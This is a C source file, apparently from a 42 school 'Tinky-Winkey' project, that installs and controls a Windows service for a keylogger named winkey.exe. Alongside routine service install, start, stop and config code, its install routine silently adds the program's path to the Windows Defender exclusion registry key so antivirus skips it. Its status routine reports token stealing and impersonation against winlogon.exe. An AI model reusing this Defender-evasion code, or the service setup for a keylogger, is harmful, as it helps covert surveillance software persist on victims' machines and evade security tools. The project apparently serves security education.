/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service_control.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/11 13:31:13 by vzurera-          #+#    #+#             */
/*   Updated: 2025/08/13 18:50:31 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "svc.h"

	#include <stdio.h>

#pragma endregion

#pragma region "Actions"

	#pragma region "Windows Defender"

		static int WindowsDefenderException(BOOL Create) {
			HKEY hKey; LONG result;

			if (!g_WinkeyPath[0]) return (1);
			// Ruta del registro donde Windows Defender almacena las exclusiones
			const char* regPath = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";

			result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_WRITE, &hKey);
			if (result != ERROR_SUCCESS) return (1);

			if (Create) {
				DWORD value = 0; // El valor a establecer (0 indica que está excluido)
				result = RegSetValueExA(hKey, g_WinkeyPath, 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
			} else result = RegDeleteValueA(hKey, g_WinkeyPath);
			if (result != ERROR_SUCCESS) { RegCloseKey(hKey); return (1); }

			RegCloseKey(hKey);
			return (0);
		}

	#pragma endregion

	#pragma region "Help"

		static int help(char *exe) {		
			printf("Usage: %s [command] [options]\n\n", exe);
			printf("Available commands:\n\n");
			printf("  install                    - Install the service\n");
			printf("  delete                     - Delete the service\n");
			printf("\n");
			printf("  start                      - Start the service\n");
			printf("  stop                       - Stop the service\n");
			printf("\n");
			printf("  config start auto          - Configure automatic startup\n");
			printf("  config start delayed-auto  - Configure delayed automatic startup\n");
			printf("  config start manual        - Configure manual startup\n");
			printf("  config start disabled      - Disable the service\n");
			printf("\n");
			printf("  status                     - Show service status\n");
			printf("  version                    - Show service version\n");
			printf("  help                       - Show this help\n");

			return (0);
		}

	#pragma endregion

	#pragma region "Install"

		static int install(void) {
			SC_HANDLE hSCManager = NULL;
			SC_HANDLE hService = NULL;
			
			// Open the Service Control Manager
			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
			if (hSCManager == NULL) {
				printf("[!] Error opening Service Control Manager\n");
				return (1);
			}
			
			// Check if the service already exists
			hService = OpenService(hSCManager, Name, SERVICE_ALL_ACCESS);
			if (hService != NULL) {
				printf("[!] Service '%s' already exists\n", Name);
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}
			
		    // Get the full path of the current executable
			char Path[MAX_PATH];
			if (GetModuleFileName(NULL, Path, MAX_PATH) == 0) {
				printf("[!] Error obtaining executable path\n");
				return (1);
			}

			// Create the service
			hService = CreateService(
				hSCManager,						// SCM database
				Name,							// Name of service
				Name,							// Service name to display
				SERVICE_ALL_ACCESS,				// Desired access							SERVICE_BOOT_START        Devices required by the operating system at boot
				SERVICE_WIN32_OWN_PROCESS,		// Service type								SERVICE_AUTO_START        Automatically started when Windows boots
				SERVICE_DEMAND_START,			// Start type								SERVICE_DEMAND_START      Started manually by the user or application
				SERVICE_ERROR_NORMAL,			// Error control type						SERVICE_DISABLED          Service is disabled and cannot be started
				Path,							// Path to service's binary
				NULL,							// No load ordering group
				NULL,							// No tag identifier
				NULL,							// No dependencies
				NULL,							// LocalSystem account
				NULL							// No password
			);

			if (hService == NULL) {
				printf("[!] Failed to create service\n");
				CloseServiceHandle(hSCManager);
				return (1);
			}

		    // Service description
			SERVICE_DESCRIPTION sd;
			sd.lpDescription = (LPSTR)"42 Tinky-Winkey Service";
			ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sd);

			printf("[+] Service '%s' installed successfully\n", Name);

			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);

			WindowsDefenderException(TRUE);

			return (0);
		}

	#pragma endregion

	#pragma region "Delete"

		static int delete(void) {
			SC_HANDLE hSCManager = NULL;
			SC_HANDLE hService = NULL;
			SERVICE_STATUS serviceStatus;

			// Open the Service Control Manager
			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
			if (hSCManager == NULL) { printf("[!] Error opening Service Control Manager\n"); return (1); }

			// Check if the service already exists
			hService = OpenService(hSCManager, Name, SERVICE_ALL_ACCESS);
			if (hService == NULL) {
				printf("[!] Service '%s' doesn't exist\n", Name);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Check the status of the service
			if (QueryServiceStatus(hService, &serviceStatus) == FALSE) {
				printf("[!] Failed to query service status\n");
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// If the service is running, try to stop it
			if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
				printf("[*] Stopping service...\n");
				if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus) == FALSE) {
					printf("[!] Failed to stop service\n");
					CloseServiceHandle(hService);
					CloseServiceHandle(hSCManager);
					return (1);
				}

				// Wait for the service to stop (with timeout)
				DWORD startTime = GetTickCount();
				while (serviceStatus.dwCurrentState != SERVICE_STOPPED) { Sleep(500);
					if (QueryServiceStatus(hService, &serviceStatus) == FALSE) break;
					if (GetTickCount() - startTime > 10000)	{ printf("[!] Timeout waiting for service to stop\n");						break; }
				}
			}

			// Delete the service
			if (DeleteService(hService) == FALSE) {
				switch (GetLastError()) {
					case ERROR_SERVICE_MARKED_FOR_DELETE:	printf("[!] Service is already marked for deletion\n");						break;
					case ERROR_ACCESS_DENIED:				printf("[!] Access denied. Ensure no processes are using the service.\n");	break;
					default:								printf("[!] Failed to delete service\n");
				}
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			printf("[+] Service '%s' deleted successfully\n", Name);

			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);

			WindowsDefenderException(FALSE);

			return (0);
		}

	#pragma endregion

	#pragma region "Start"

		static int start(void) {
			SC_HANDLE hSCManager = NULL;
			SC_HANDLE hService = NULL;

			// Open the Service Control Manager
			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
			if (hSCManager == NULL) { printf("[!] Error opening Service Control Manager\n"); return (1); }

			// Open the service
			hService = OpenService(hSCManager, Name, SERVICE_START);
			if (hService == NULL) {
				switch (GetLastError()) {
					case ERROR_SERVICE_DOES_NOT_EXIST:		printf("[!] Service does not exist\n");										break;
					case ERROR_ACCESS_DENIED:				printf("[!] Access denied. Check administrator privileges\n");				break;
					default:								printf("[!] Failed to open service\n");
				}
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Try to start the service
			if (!StartService(hService, 0, NULL)) {
				switch (GetLastError()) {
					case ERROR_SERVICE_ALREADY_RUNNING:		printf("[*] Service is already running\n");									break;
					case ERROR_SERVICE_DISABLED:			printf("[!] Service is disabled\n");										break;
					case ERROR_SERVICE_DOES_NOT_EXIST:		printf("[!] Service does not exist\n");										break;
					case ERROR_ACCESS_DENIED:				printf("[!] Access denied. Check administrator privileges\n");				break;
					default:								printf("[!] Failed to start service\n");
				}
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			printf("[+] Service '%s' started successfully\n", Name);

			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);
			return (0);
		}

	#pragma endregion

	#pragma region "Stop"

		static int stop(void) {
			SC_HANDLE hSCManager = NULL;
			SC_HANDLE hService = NULL;
			SERVICE_STATUS serviceStatus;

			// Open the Service Control Manager
			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
			if (hSCManager == NULL) { printf("[!] Error opening Service Control Manager\n"); return (1); }

			// Open the service
			hService = OpenService(hSCManager, Name, SERVICE_STOP);
			if (hService == NULL) {
				switch (GetLastError()) {
					case ERROR_SERVICE_DOES_NOT_EXIST:		printf("[!] Service does not exist\n");										break;
					case ERROR_ACCESS_DENIED:				printf("[!] Access denied. Check administrator privileges\n");				break;
					default:								printf("[!] Failed to open service\n");
				}
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Try to stop the service
			if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
				switch (GetLastError()) {
					case ERROR_SERVICE_NOT_ACTIVE:			printf("[*] Service is already stopped\n");									break;
					case ERROR_SERVICE_DOES_NOT_EXIST:		printf("[!] Service does not exist\n");										break;
					default:								printf("[!] Failed to stop service\n");
				}
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Wait for the service to stop (with timeout)
			DWORD startTime = GetTickCount();
			while (serviceStatus.dwCurrentState != SERVICE_STOPPED) { Sleep(500);
				if (QueryServiceStatus(hService, &serviceStatus) == FALSE) break;
				if (GetTickCount() - startTime > 10000)	{ printf("[!] Timeout waiting for service to stop\n");							break; }
			}

			printf("[+] Service '%s' stopped successfully\n", Name);

			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);
			return (0);
		}

	#pragma endregion

	#pragma region "Config"

		static int config(char *exe, char *arg) {
			SC_HANDLE hSCManager = NULL;
			SC_HANDLE hService = NULL;
			BOOL success = FALSE;
			DWORD startType;
			BOOL isDelayedAuto = FALSE;
			BOOL isRegularAuto = FALSE;

			// Determine the start type based on the argument
			if (!strcmp(arg, "manual") || !strcmp(arg, "demand"))			  startType = SERVICE_DEMAND_START;
			else if (!strcmp(arg, "auto"))									{ startType = SERVICE_AUTO_START; isRegularAuto = TRUE; }
			else if (!strcmp(arg, "delayed-auto"))							{ startType = SERVICE_AUTO_START; isDelayedAuto = TRUE; }
			else if (!strcmp(arg, "disabled"))								  startType = SERVICE_DISABLED;
			else															return (help(exe), 1);

			// Open the Service Control Manager
			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
			if (hSCManager == NULL) { printf("[!] Error opening Service Control Manager\n"); return (1); }

			// Open the service
			hService = OpenService(hSCManager, Name, SERVICE_CHANGE_CONFIG);
			if (hService == NULL) {
				printf("[!] Failed to open service\n");
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Change the service's startup configuration
			success = ChangeServiceConfig(
				hService,						// handle to the service
				SERVICE_NO_CHANGE,				// service type		(no changes)
				startType,						// start type
				SERVICE_NO_CHANGE,				// error control	(no changes)
				NULL,							// binary path		(no changes)
				NULL,							// load order group	(no changes)
				NULL,							// tag ID			(no changes)
				NULL,							// dependencies		(no changes)
				NULL,							// service account	(no changes)
				NULL,							// password			(no changes)
				NULL							// display name		(no changes)
			);

			if (!success) {
				printf("[!] Failed to configure service\n");
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Configure or disable delayed start as needed
			SERVICE_DELAYED_AUTO_START_INFO delayedInfo;
			delayedInfo.fDelayedAutostart = isDelayedAuto ? TRUE : FALSE;

			if (isDelayedAuto || isRegularAuto) {
				success = ChangeServiceConfig2(hService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &delayedInfo);
				if (!success) printf("[!] Failed to %s delayed auto-start\n", isDelayedAuto ? "set" : "clear");
			}

			printf("[+] Service start type successfully set to '%s'\n", arg);

			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);

			return (0);
		}

	#pragma endregion

	#pragma region "Status"

		static int winkey_status() {
			DWORD PID = GetProcessIdByName("winkey.exe");

			printf("\nStatus of Winkey:\n");
			printf("-----------------\n");
			printf("Status:          %s\n", PID ? "RUNNING" : "STOPPED");

			if (PID) {
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);
				if (!hProcess) hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
				if (hProcess) {
					char path[MAX_PATH] = {0};
					DWORD size = MAX_PATH;
					QueryFullProcessImageNameA(hProcess, 0, path, &size);
					printf("Binary Path:     %s\n", *path ? path : "Unknown");
					printf("Process ID:      %lu\n", PID);
					printf("\nToken Stealing:      WINKEY      WINLOGON\n");
					printf("                     ------      --------\n");
					
					BOOL success = CompareTokens("winlogon.exe", "winkey.exe");
					printf("\nImpersonation:   %s\n", success ? "Successful" : "Failed");
					
					CloseHandle(hProcess);
				} else {
					printf("Process ID:      %lu\n", PID);
				}
			}

			return (0);
		}

		static int status(void) {
			// Open the Service Control Manager
			SC_HANDLE hSCManager = NULL;
			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
			if (!hSCManager) {
				printf("[!] Error opening Service Control Manager\n");
				return (1);
			}
			
			// Open the service
			SC_HANDLE hService = NULL;
			hService = OpenService(hSCManager, Name, SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
			if (!hService) {
				printf("[!] Service '%s' doesn't exist\n", Name);
				CloseServiceHandle(hSCManager);
				return (1);
			}
			
			// Get service configuration
			LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL; DWORD cbBytesNeeded = 0;
			if (!QueryServiceConfig(hService, NULL, 0, &cbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				lpServiceConfig = (LPQUERY_SERVICE_CONFIG)malloc(cbBytesNeeded);
				if (lpServiceConfig) {
					if (!QueryServiceConfig(hService, lpServiceConfig, cbBytesNeeded, &cbBytesNeeded)) {
						printf("[!] Failed to query service configuration\n");
						free(lpServiceConfig);
						CloseServiceHandle(hService);
						CloseServiceHandle(hSCManager);
						return (1);
					}
				}
			}
			
			// Get current service status
			SERVICE_STATUS_PROCESS statusProcess; DWORD bytesNeeded = 0;
			if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusProcess, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
				printf("[!] Failed to query service status\n");
				if (lpServiceConfig) free(lpServiceConfig);
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				return (1);
			}

			// Check if service is delayed-auto start
			BOOL isDelayedStart = FALSE;
			SERVICE_DELAYED_AUTO_START_INFO delayedInfo;
			if (lpServiceConfig && lpServiceConfig->dwStartType == SERVICE_AUTO_START) {
				if (QueryServiceConfig2(hService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, (LPBYTE)&delayedInfo, sizeof(SERVICE_DELAYED_AUTO_START_INFO), &bytesNeeded)) {
					isDelayedStart = delayedInfo.fDelayedAutostart;
				}
			}

			printf("Status of %s:\n", Name);
			printf("----------------\n");

			printf("Status:          ");
			switch (statusProcess.dwCurrentState) {
				case SERVICE_STOPPED:				printf("STOPPED\n");			break;
				case SERVICE_START_PENDING:			printf("STARTING\n");			break;
				case SERVICE_STOP_PENDING:			printf("STOPPING\n");			break;
				case SERVICE_RUNNING:				printf("RUNNING\n");			break;
				case SERVICE_CONTINUE_PENDING:		printf("CONTINUE PENDING\n");	break;
				case SERVICE_PAUSE_PENDING:			printf("PAUSE PENDING\n");		break;
				case SERVICE_PAUSED:				printf("PAUSED\n");				break;
				default:							printf("UNKNOWN\n");			break;
			}

			if (lpServiceConfig) {
				printf("Start Type:      ");
				switch (lpServiceConfig->dwStartType) {
					case SERVICE_AUTO_START:				printf("%s\n", isDelayedStart ? "AUTO (DELAYED)" : "AUTO");		break;
					case SERVICE_DEMAND_START:				printf("MANUAL\n");												break;
					case SERVICE_DISABLED:					printf("DISABLED\n");											break;
					case SERVICE_BOOT_START:				printf("BOOT\n");												break;
					case SERVICE_SYSTEM_START:				printf("SYSTEM\n");												break;
					default:								printf("UNKNOWN\n");											break;
				}

				printf("Binary Path:     %s\n", lpServiceConfig->lpBinaryPathName);

				printf("Service Type:    ");
				if (lpServiceConfig->dwServiceType & SERVICE_WIN32_OWN_PROCESS)		printf("WIN32_OWN_PROCESS");
				if (lpServiceConfig->dwServiceType & SERVICE_WIN32_SHARE_PROCESS)	printf("WIN32_SHARE_PROCESS");
				if (lpServiceConfig->dwServiceType & SERVICE_KERNEL_DRIVER)			printf("KERNEL_DRIVER");
				if (lpServiceConfig->dwServiceType & SERVICE_FILE_SYSTEM_DRIVER)	printf("FILE_SYSTEM_DRIVER");
				if (lpServiceConfig->dwServiceType & SERVICE_INTERACTIVE_PROCESS)	printf(" (INTERACTIVE)");

				printf("\nAccount:         %s\n", lpServiceConfig->lpServiceStartName);
			}

			if (statusProcess.dwCurrentState == SERVICE_RUNNING || statusProcess.dwCurrentState == SERVICE_PAUSED)
				printf("Process ID:      %lu\n", statusProcess.dwProcessId);

			winkey_status();

			if (lpServiceConfig) free(lpServiceConfig);
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);

			return (0);
		}

	#pragma endregion

#pragma endregion

#pragma region "Control"

	int control(int argc, char **argv) {
		printf("\n");

		if (argc <= 1) ;
		else if (argc == 2 && !strcmp(argv[1], "install"))   													return (install());
		else if (argc == 2 && !strcmp(argv[1], "delete"))    													return (delete());

		else if (argc == 2 && !strcmp(argv[1], "start"))     													return (start());
		else if (argc == 2 && !strcmp(argv[1], "stop"))      													return (stop());

		else if (argc == 2 && (!strcmp(argv[1], "help") || !strcmp(argv[1], "-h") || !strcmp(argv[1], "/?")))	return (help(argv[0]));
		else if (argc == 2 && (!strcmp(argv[1], "version") || !strcmp(argv[1], "-v")))							return (printf("%s version: %s\n", Name, Version), 0);

		else if (argc == 2 && !strcmp(argv[1], "status"))														return (status());
		else if (argc == 4 && !strcmp(argv[1], "config") && !strcmp(argv[2], "start"))							return (config(argv[0], argv[3]));

		return (help(argv[0]), 1);
	}

#pragma endregion
